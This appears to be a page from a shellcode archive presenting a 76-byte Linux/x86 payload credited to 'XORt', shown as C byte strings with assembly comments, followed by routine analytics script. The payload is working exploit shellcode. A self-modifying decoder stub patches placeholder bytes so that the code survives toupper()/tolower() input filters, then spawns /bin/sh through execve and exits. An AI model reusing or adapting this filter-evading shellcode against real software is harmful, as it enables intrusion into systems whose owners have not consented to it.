<html><head><title>Linux/x86 - Magic Byte Self Modifying Code for surviving - execve() _exit() - 76 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*-------------------------------------------------------*/
/*     Magic Byte Self Modifying Code for surviving      */
/*               toupper() &amp; tolower()                   */
/*        76bytes execve() _exit() code by XORt          */
/*-------------------------------------------------------*/
&quot;\xeb\x34&quot;               /* jmp $0x34          [revert]  */
&quot;\x5e&quot;                   /* pop %esi                     */
/*--set-up-variables-------------------------------------*/
&quot;\x89\xf7&quot;               /* mov %esi, %edi               */
&quot;\x83\xef\x22&quot;           /* sub $0x22, %edi              */
&quot;\x31\xc9&quot;               /* xor %ecx, %ecx               */
&quot;\xb1\x8c&quot;               /* mov $0x8c, %cl               */
&quot;\xd1\xc9&quot;               /* ror $0x1, %ecx    (70loops)  */
/*-scan-for-magic-byte-----------------------------------*/
&quot;\xb0\x7b&quot;               /* mov $0x7b, %al               */
&quot;\xf2\xae&quot;               /* repne scasb                  */
&quot;\xff\xcf&quot;               /* dec %edi                     */
&quot;\xac&quot;                   /* lodsb            (al=DS:SI)  */
&quot;\x28\x07&quot;               /* subb %al, (%edi)             */
/*--loop-back-to-scanner---------------------------------*/
&quot;\xe2\xf5&quot;               /* loop -$0xe      [load-byte]  */
/*-------------------------------------[length:25bytes]--*/
//                                                       //
/*--modified-shellcode-----------------------------------*/
&quot;\x89\x7b\x08&quot;           /* movl %esi, 0x8(%esi)        @*/
&quot;\x91&quot;                   /* xchg %eax, %ecx              */
&quot;\x88\x7b\x07&quot;           /* movb %al, 0x7(%esi)         @*/
&quot;\x89\x7b\x0c&quot;           /* movl %eax, 0xc(%esi)        @*/
&quot;\xb0\x0b&quot;               /* movb $0xb, %al               */
&quot;\x89\xf3&quot;               /* movl %esi, %ebx              */
&quot;\x8d\x7b\x08&quot;           /* leal 0x8(%esi), %ecx        @*/
&quot;\x8d\x7b\x0c&quot;           /* leal 0xc(%esi), %edx        @*/
&quot;\xcd\x80&quot;               /* int $0x80                    */
&quot;\x31\xdb&quot;               /* xorl %ebx, %ebx              */
&quot;\x89\xd8&quot;               /* movl %ebx, %eax              */
&quot;\x40&quot;                   /* inc %eax                     */
&quot;\xcd\x80&quot;               /* int $0x80                    */
/*--revert-----------------------------------------------*/
&quot;\xe8\xc7\xff\xff\xff&quot;   /* call -$0x39                  */
/*--offset-table-----------------------------------------*/
&quot;\x05\x35\x35\x2d\x25\x19\x12\x0d\x08\x13&quot;             /**/
/*--string-to-run----------------------------------------*/
&quot;/\x7b\x7b\x7b/\x7b\x7b&quot; /* .string &quot;/bin/sh&quot;            */
/*--------------------------------------[length:51bytes]-*/




<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
